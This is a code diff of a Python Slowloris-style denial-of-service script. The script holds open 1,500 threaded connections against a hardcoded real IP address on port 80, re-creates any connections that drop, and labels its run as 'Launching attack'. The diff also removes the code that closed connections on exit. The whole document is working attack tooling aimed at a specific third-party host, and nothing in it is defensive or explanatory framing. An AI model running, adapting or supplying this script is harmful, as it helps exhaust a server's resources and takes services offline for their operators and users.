@@ -4,19 +4,23 @@ import random
 from typing import Optional
 from concurrent.futures import ThreadPoolExecutor
 
-from utils.files import Files as fls
-from utils.messages import Messages as msg
+from utils.files import Files
+from utils.messages import Messages
 from core.slowsock import Slowsock
 
 # Constants
-CONNECTIONS_AMOUNT = 1000
-THREADS_AMOUNT = 200
+CONNECTIONS_AMOUNT = 1500
+THREADS_AMOUNT = CONNECTIONS_AMOUNT * 0.35
 TARGET_ADDRESS = "92.222.117.57"
-TARGET_PORT = 443
-WAIT_TIME = 0.5
-TIMEOUT = 15
-USER_AGENTS = fls.read_file("files/user-agents.txt")
-REFERERS = fls.read_file("files/referers.txt")
+TARGET_PORT = 80
+WAIT_TIME = 15
+TIMEOUT = 10
+USER_AGENTS = Files.read_file("files/user-agents.txt")
+REFERERS = Files.read_file("files/referers.txt")
+VERBOSE = True
+
+# Objects
+msg = Messages(verbose=VERBOSE)
 
 
 # Function to create a socket
@@ -38,11 +42,6 @@ def create_socket(*args) -> Optional[Slowsock]:
         msg.show_error(f"An unexpected error occurred while creating a socket: {error}")
 
 
-# Function to close a socket
-def close_socket(socket: Slowsock) -> None:
-    socket.close_connection()
-
-
 # Function to create a set of sockets
 def create_socket_set(socket_amount: int) -> list[Slowsock]:
     with ThreadPoolExecutor(max_workers=THREADS_AMOUNT) as executor:
@@ -58,7 +57,6 @@ def send_data(socket: Slowsock, socket_set: list[Slowsock]) -> None:
     socket.send_data(header)
     if socket.get_status() != 2:
         socket_set.remove(socket)
-        close_socket(socket)
 
 
 # Main function
@@ -69,38 +67,42 @@ if __name__ == "__main__":
     # Main loop
     try:
         # Create a set of sockets
+        msg.show_info(f"Launching attack to {TARGET_ADDRESS} on port {TARGET_PORT}...")
         msg.show_info(f"Creating {CONNECTIONS_AMOUNT} connections...\n")
         socket_set = create_socket_set(CONNECTIONS_AMOUNT)
 
-        # Maintain the connection alive
-        msg.show_info("Ensuring each connection stays alive...\n")
         while True:
             # Try to send data through each socket
-            msg.show_info("Sending data through each connection...")
+            msg.show_info("Trying to send data through each active connection...\n")
             with ThreadPoolExecutor(max_workers=THREADS_AMOUNT) as executor:
                 executor.map(send_data, socket_set)
 
-            # Show a message
-            msg.show_success("Data has been sent successfully.")
+            # Create sockets if they have been closed
+            remaining_sockets = len(socket_set)
+            required_amount = CONNECTIONS_AMOUNT - remaining_sockets
+            msg.show_success(
+                f"Data was sent through {remaining_sockets} active connections."
+            )
 
-            # Create sockets if some have been closed
-            required_amount = CONNECTIONS_AMOUNT - len(socket_set)
             if required_amount > 0:
-                print("\n")
-                msg.show_warning("Some sockets were lost.")
-                msg.show_info(f"Creating {required_amount} sockets...")
+                # Try to create new connections
+                msg.show_warning(
+                    f"It seems {required_amount} connections were lost in the process."
+                )
+                msg.show_info(f"Trying to create missing connections...")
                 socket_set += create_socket_set(required_amount)
 
-            # Wait for a while
-            msg.show_info(f"Waiting {WAIT_TIME} seconds before continuing...\n")
+                # Check if new connections were created
+                new_amount = len(socket_set) - remaining_sockets
+                if new_amount > 0:
+                    msg.show_success(f"{new_amount} connections have been created.\n")
+                else:
+                    msg.show_error("No new connections could be created.\n")
+
+            # Wait before continuing
+            msg.show_info(f"Waiting {WAIT_TIME} seconds before continuing...")
             time.sleep(WAIT_TIME)
     except KeyboardInterrupt:
-        # Close all connections
-        msg.show_warning("Closing all connections...")
-        with ThreadPoolExecutor(max_workers=THREADS_AMOUNT) as executor:
-            executor.map(close_socket, socket_set)
-
-        # Show a message
-        msg.show_success("All connections have been closed successfully.")
+        msg.show_warning("The process has been stopped.")
     except Exception as error:
         msg.show_error(f"An unexpected error occurred: {error}")
